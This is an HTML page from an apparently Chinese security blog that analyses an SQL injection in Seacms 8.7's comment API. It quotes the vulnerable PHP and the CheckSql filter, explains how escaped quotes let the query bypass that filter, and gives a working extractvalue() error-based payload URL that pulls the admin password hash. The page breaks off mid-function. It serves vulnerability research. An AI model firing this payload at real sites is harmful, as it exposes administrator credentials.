@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Seacms 8.7版本SQL注入分析 - F0rmat&#39;Blog</title>
+<link rel="stylesheet" type="text/css" href="/css/main.css">
+</head>
+<body>
+<header>
+  <div>
+    <h1><a href="https://getshe11.com/">F0rmat&#39;Blog</a></h1>
+  </div>
+  <nav></nav>
+</header>
+<main>
+  <article>
+    <div class="title">
+  <h1>Seacms 8.7版本SQL注入分析</h1>
+  </div>
+<div style="position: fixed; right:-30px; max-width:300px; overflow:auto; top: 1px; width: 300px; bottom:100px">
+<div class="container text-center mt-3">
+    <iframe src="https://duckduckgo.com/search.html?site=https://getshe11.com/&prefill=" style="overflow:hidden;margin:0;padding:0;max-width:80%;height:40px;" frameborder="0"></iframe>
+</div>
+</div>
+<div class="meta">
+  <div>2019-03-04 15:49</div>
+  <div>
+    <span><a href="https://getshe11.com/tags/php/">#php</a></span>
+      <span><a href="https://getshe11.com/tags/seacms/">#seacms</a></span>
+      </div>
+  </div>
+<div class="content">
+  <h1 id="0x01-前言">0x01 前言</h1>
+<p>好像没发文章了，在t00ls看到一篇seacms8.7的分析文，不过不是最新的版本，好久没看到seacms和maccms这两个cms发新的漏洞了，那个过滤有点恶心。后来还在nosec看到一篇离新版9.0比较近的一个版本8.9的一个变量覆盖到sql注入文章，但是我复现不成功，我拿的是6.53的版本，原因后面会讲到。</p>
+<h1 id="0x02-环境">0x02 环境</h1>
+<p><strong>Web：</strong> phpstudy and MAMP
+<strong>System：</strong> Windows 7 X64 and MacOS
+<strong>Browser：</strong> Firefox Quantum and Chrome
+<strong>MySQL：</strong>  5.5
+<strong>php：</strong>  5.4</p>
+<h1 id="0x03-漏洞详情">0x03 漏洞详情</h1>
+<!-- raw HTML omitted -->
+<h2 id="漏洞复现">漏洞复现</h2>
+<p>payload:</p>
+<pre><code>http://10.211.55.4/upload/comment/api/index.php?gid=1&amp;page=2&amp;rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20(password)from%20sea_admin))),@`%27`
+</code></pre><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms8.7/1.png" alt=""></p>
+<h2 id="漏洞分析">漏洞分析</h2>
+<p>在此之前我在MySQL 5.6、5.7上面复现都不成功，因为这两个版本用<code>extractvalue()</code>、<code>updatexml()</code>报错注入不成功，后来换了系统Linux和Windows还有macOS来测试也是一样，和PHP、Apache的版本没有影响只要的还是MySQL的版本问题，所以大家测试的时候注意一下版本。</p>
+<p>漏洞文件是在：<code>comment/api/index.php</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#a6e22e">session_start</span>();
+<span style="color:#66d9ef">require_once</span>(<span style="color:#e6db74">&#34;../../include/common.php&#34;</span>);
+$id <span style="color:#f92672">=</span> (<span style="color:#a6e22e">isset</span>($gid) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">is_numeric</span>($gid)) <span style="color:#f92672">?</span> $gid <span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>;
+$page <span style="color:#f92672">=</span> (<span style="color:#a6e22e">isset</span>($page) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">is_numeric</span>($page)) <span style="color:#f92672">?</span> $page <span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>;
+$type <span style="color:#f92672">=</span> (<span style="color:#a6e22e">isset</span>($type) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">is_numeric</span>($type)) <span style="color:#f92672">?</span> $type <span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>;
+$pCount <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+$jsoncachefile <span style="color:#f92672">=</span> <span style="color:#a6e22e">sea_DATA</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34;/cache/review/</span><span style="color:#e6db74">$type</span><span style="color:#e6db74">/</span><span style="color:#e6db74">$id</span><span style="color:#e6db74">.js&#34;</span>;
+<span style="color:#75715e">//缓存第一页的评论
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span>($page<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">2</span>)
+{
+	<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">file_exists</span>($jsoncachefile))
+	{
+		$json<span style="color:#f92672">=</span><span style="color:#a6e22e">LoadFile</span>($jsoncachefile);
+		<span style="color:#66d9ef">die</span>($json);
+	}
+}
+$h <span style="color:#f92672">=</span> <span style="color:#a6e22e">ReadData</span>($id,$page);
+$rlist <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
+<span style="color:#66d9ef">if</span>($page<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">2</span>)
+{
+	<span style="color:#a6e22e">createTextFile</span>($h,$jsoncachefile);
+}
+<span style="color:#66d9ef">die</span>($h);	
+
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">ReadData</span>($id,$page)
+{
+	<span style="color:#66d9ef">global</span> $type,$pCount,$rlist;
+	$ret <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,$page,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">10</span>,$type,$id);
+	<span style="color:#66d9ef">if</span>($id<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span>)
+	{
+		$ret[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">Readmlist</span>($id,$page,$ret[<span style="color:#ae81ff">4</span>]);
+		$ret[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> $pCount;
+		$x <span style="color:#f92672">=</span> <span style="color:#a6e22e">implode</span>(<span style="color:#e6db74">&#39;,&#39;</span>,$rlist);
+		<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($x))
+		{
+		$ret[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">Readrlist</span>($x,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">10000</span>);
+		}
+	}	
+	$readData <span style="color:#f92672">=</span> <span style="color:#a6e22e">FormatJson</span>($ret);
+	<span style="color:#66d9ef">return</span> $readData;
+}
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Readmlist</span>($id,$page,$size)
+{
+	<span style="color:#66d9ef">global</span> $dsql,$type,$pCount,$rlist;
+	$ml<span style="color:#f92672">=</span><span style="color:#66d9ef">array</span>();
+	<span style="color:#66d9ef">if</span>($id<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span>)
+	{
+		$sqlCount <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SELECT count(*) as dd FROM sea_comment WHERE m_type=</span><span style="color:#e6db74">$type</span><span style="color:#e6db74"> AND v_id=</span><span style="color:#e6db74">$id</span><span style="color:#e6db74"> ORDER BY id DESC&#34;</span>;
+		$rs <span style="color:#f92672">=</span> $dsql <span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">GetOne</span>($sqlCount);
+		$pCount <span style="color:#f92672">=</span> <span style="color:#a6e22e">ceil</span>($rs[<span style="color:#e6db74">&#39;dd&#39;</span>]<span style="color:#f92672">/</span>$size);
+		$sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM sea_comment WHERE m_type=</span><span style="color:#e6db74">$type</span><span style="color:#e6db74"> AND v_id=</span><span style="color:#e6db74">$id</span><span style="color:#e6db74"> ORDER BY id DESC limit &#34;</span><span style="color:#f92672">.</span>($page<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span>$size<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;,</span><span style="color:#e6db74">$size</span><span style="color:#e6db74"> &#34;</span>;
+		$dsql<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setQuery</span>($sql);
+		$dsql<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Execute</span>(<span style="color:#e6db74">&#39;commentmlist&#39;</span>);
+		<span style="color:#66d9ef">while</span>($row<span style="color:#f92672">=</span>$dsql<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">GetArray</span>(<span style="color:#e6db74">&#39;commentmlist&#39;</span>))
+		{
+			$row[<span style="color:#e6db74">&#39;reply&#39;</span>]<span style="color:#f92672">.=</span><span style="color:#a6e22e">ReadReplyID</span>($id,$row[<span style="color:#e6db74">&#39;reply&#39;</span>],$rlist);
+			$ml[]<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">cmid</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:&#34;</span><span style="color:#f92672">.</span>$row[<span style="color:#e6db74">&#39;id&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">uid</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:&#34;</span><span style="color:#f92672">.</span>$row[<span style="color:#e6db74">&#39;uid&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">tmp</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\&#34;\&#34;</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">nick</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>$row[<span style="color:#e6db74">&#39;username&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">face</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\&#34;\&#34;</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">star</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\&#34;\&#34;</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">anony</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:&#34;</span><span style="color:#f92672">.</span>(<span style="color:#66d9ef">empty</span>($row[<span style="color:#e6db74">&#39;username&#39;</span>])<span style="color:#f92672">?</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">from</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>$row[<span style="color:#e6db74">&#39;username&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">time</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">date</span>(<span style="color:#e6db74">&#34;Y/n/j H:i:s&#34;</span>,$row[<span style="color:#e6db74">&#39;dtime&#39;</span>])<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">reply</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>$row[<span style="color:#e6db74">&#39;reply&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">content</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>$row[<span style="color:#e6db74">&#39;msg&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">agree</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:&#34;</span><span style="color:#f92672">.</span>$row[<span style="color:#e6db74">&#39;agree&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">aginst</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:&#34;</span><span style="color:#f92672">.</span>$row[<span style="color:#e6db74">&#39;anti&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">pic</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>$row[<span style="color:#e6db74">&#39;pic&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">vote</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>$row[<span style="color:#e6db74">&#39;vote&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">allow</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>(<span style="color:#66d9ef">empty</span>($row[<span style="color:#e6db74">&#39;anti&#39;</span>])<span style="color:#f92672">?</span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">check</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>$row[<span style="color:#e6db74">&#39;ischeck&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">}&#34;</span>;
+		}
+	}
+	$readmlist<span style="color:#f92672">=</span><span style="color:#a6e22e">join</span>($ml,<span style="color:#e6db74">&#34;,&#34;</span>);
+	<span style="color:#66d9ef">return</span> $readmlist;
+}
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Readrlist</span>($ids,$page,$size)
+{
+	<span style="color:#66d9ef">global</span> $dsql,$type;
+	$rl<span style="color:#f92672">=</span><span style="color:#66d9ef">array</span>();
+	$sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM sea_comment WHERE m_type=</span><span style="color:#e6db74">$type</span><span style="color:#e6db74"> AND id in (</span><span style="color:#e6db74">$ids</span><span style="color:#e6db74">) ORDER BY id DESC&#34;</span>;
+	$dsql<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setQuery</span>($sql);
+	$dsql<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Execute</span>(<span style="color:#e6db74">&#39;commentrlist&#39;</span>);
+	<span style="color:#66d9ef">while</span>($row<span style="color:#f92672">=</span>$dsql<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">GetArray</span>(<span style="color:#e6db74">&#39;commentrlist&#39;</span>))
+	{
+		$rl[]<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>$row[<span style="color:#e6db74">&#39;id&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:{</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">uid</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:&#34;</span><span style="color:#f92672">.</span>$row[<span style="color:#e6db74">&#39;uid&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">tmp</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\&#34;\&#34;</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">nick</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>$row[<span style="color:#e6db74">&#39;username&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">face</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\&#34;\&#34;</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">star</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\&#34;\&#34;</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">anony</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:&#34;</span><span style="color:#f92672">.</span>(<span style="color:#66d9ef">empty</span>($row[<span style="color:#e6db74">&#39;username&#39;</span>])<span style="color:#f92672">?</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">from</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>$row[<span style="color:#e6db74">&#39;username&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">time</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>$row[<span style="color:#e6db74">&#39;dtime&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">reply</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>$row[<span style="color:#e6db74">&#39;reply&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">content</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>$row[<span style="color:#e6db74">&#39;msg&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">agree</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:&#34;</span><span style="color:#f92672">.</span>$row[<span style="color:#e6db74">&#39;agree&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">aginst</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:&#34;</span><span style="color:#f92672">.</span>$row[<span style="color:#e6db74">&#39;anti&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">pic</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>$row[<span style="color:#e6db74">&#39;pic&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">vote</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>$row[<span style="color:#e6db74">&#39;vote&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">allow</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>(<span style="color:#66d9ef">empty</span>($row[<span style="color:#e6db74">&#39;anti&#39;</span>])<span style="color:#f92672">?</span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">check</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>$row[<span style="color:#e6db74">&#39;ischeck&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">}&#34;</span>;
+	}
+	$readrlist<span style="color:#f92672">=</span><span style="color:#a6e22e">join</span>($rl,<span style="color:#e6db74">&#34;,&#34;</span>);
+	<span style="color:#66d9ef">return</span> $readrlist;
+}
+
+</code></pre></div><p>传入<code>$rlist</code>的值为我们构造的sql语句：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-mysql" data-lang="mysql"><span style="color:#f92672">@`</span><span style="color:#e6db74">&#39;`, extractvalue(1, concat_ws(0x20, 0x5c,(select (password)from sea_admin))),@`&#39;</span><span style="color:#f92672">`</span>
+</code></pre></div><p>通过<code>ReadData</code>函数，<code>implode</code>处理后传入<code>Readrlist</code>函数</p>
+<p>可以看到执行的SQL语句是</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms8.7/2.png" alt=""></p>
+<p>它在<code>$dsql-&gt;Execute('commentrlist');</code>这句的时候会有一个SQL的安全检测</p>
+<p>文件在<code>include/sql.class.php</code>的<code>CheckSql</code>函数</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">//完整的SQL检查
+</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">while</span> (<span style="color:#66d9ef">true</span>)
+	{
+		$pos <span style="color:#f92672">=</span> <span style="color:#a6e22e">strpos</span>($db_string, <span style="color:#e6db74">&#39;\&#39;&#39;</span>, $pos <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
+		<span style="color:#66d9ef">if</span> ($pos <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>)
+		{
+			<span style="color:#66d9ef">break</span>;
+		}
+		$clean <span style="color:#f92672">.=</span> <span style="color:#a6e22e">substr</span>($db_string, $old_pos, $pos <span style="color:#f92672">-</span> $old_pos);
+		<span style="color:#66d9ef">while</span> (<span style="color:#66d9ef">true</span>)
+		{
+			$pos1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strpos</span>($db_string, <span style="color:#e6db74">&#39;\&#39;&#39;</span>, $pos <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
+			$pos2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strpos</span>($db_string, <span style="color:#e6db74">&#39;\\&#39;</span>, $pos <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
+			<span style="color:#66d9ef">if</span> ($pos1 <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>)
+			{
+				<span style="color:#66d9ef">break</span>;
+			}
+			<span style="color:#66d9ef">elseif</span> ($pos2 <span style="color:#f92672">==</span> <span style="color:#66d9ef">false</span> <span style="color:#f92672">||</span> $pos2 <span style="color:#f92672">&gt;</span> $pos1)
+			{
+				$pos <span style="color:#f92672">=</span> $pos1;
+				<span style="color:#66d9ef">break</span>;
+			}
+			$pos <span style="color:#f92672">=</span> $pos2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+		}
+		$clean <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#39;$s$&#39;</span>;
+		$old_pos <span style="color:#f92672">=</span> $pos <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+	}
+	$clean <span style="color:#f92672">.=</span> <span style="color:#a6e22e">substr</span>($db_string, $old_pos);
+	$clean <span style="color:#f92672">=</span> <span style="color:#a6e22e">trim</span>(<span style="color:#a6e22e">strtolower</span>(<span style="color:#a6e22e">preg_replace</span>(<span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;~\s+~s&#39;</span> ), <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39; &#39;</span>), $clean)));
+
+</code></pre></div><p>可以看到这里没有把我们的报错函数部分代入进去，如果代入进去检测的话就会这里检测到</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms8.7/3.png" alt=""></p>
+<p>所以上面构造的语句也很有意思</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms8.7/4.png" alt=""></p>
+<p>后面<code>$clean</code>就是要送去检测的函数，通过一番处理后得到的值为</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms8.7/5.png" alt=""></p>
+<p>后面返回来执行的的SQL语句还是原样没动</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms8.7/6.png" alt=""></p>
+<p>基本分析就完成了。</p>
+<p>最终执行的语句：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-mysql" data-lang="mysql"><span style="color:#66d9ef">SELECT</span> id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck <span style="color:#66d9ef">FROM</span> sea_comment <span style="color:#66d9ef">WHERE</span> m_type<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">AND</span> id <span style="color:#66d9ef">in</span> (<span style="color:#f92672">@`</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#39;`, extractvalue(1, concat_ws(0x20, 0x5c,(select (password)from sea_admin))),@`\&#39;</span><span style="color:#f92672">`</span>) <span style="color:#66d9ef">ORDER</span> <span style="color:#66d9ef">BY</span> id <span style="color:#66d9ef">DESC</span>
+</code></pre></div><p>还有一些问题就是构造语句的问题。</p>
+<p><strong>刚开始传入的<code>%27</code>后面怎么变成了转义后的单引号？</strong></p>
+<p>开头的时候<code>require_once(&quot;../../include/common.php&quot;);</code>就包含了这个文件,里面有一个<code>_RunMagicQuotes</code>函数，如果PHP配置没有开启<code>get_magic_quotes_gpc</code>就会用到这个函数，这个函数是把值经过<code>addslashes</code>函数的处理。此函数的作用是为所有的 ' (单引号), &quot; (双引号), \ (反斜线) and 空字符和以会自动转为含有反斜线的转义字符。</p>
+<p>所以后面的SQL语句就会加上转义符号，然后经过<code>CheckSql</code>函数的时候就绕过了对报错语句的检测。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">_RunMagicQuotes</span>(<span style="color:#f92672">&amp;</span>$svar)
+{
+	<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">get_magic_quotes_gpc</span>())
+	{
+		<span style="color:#66d9ef">if</span>( <span style="color:#a6e22e">is_array</span>($svar) )
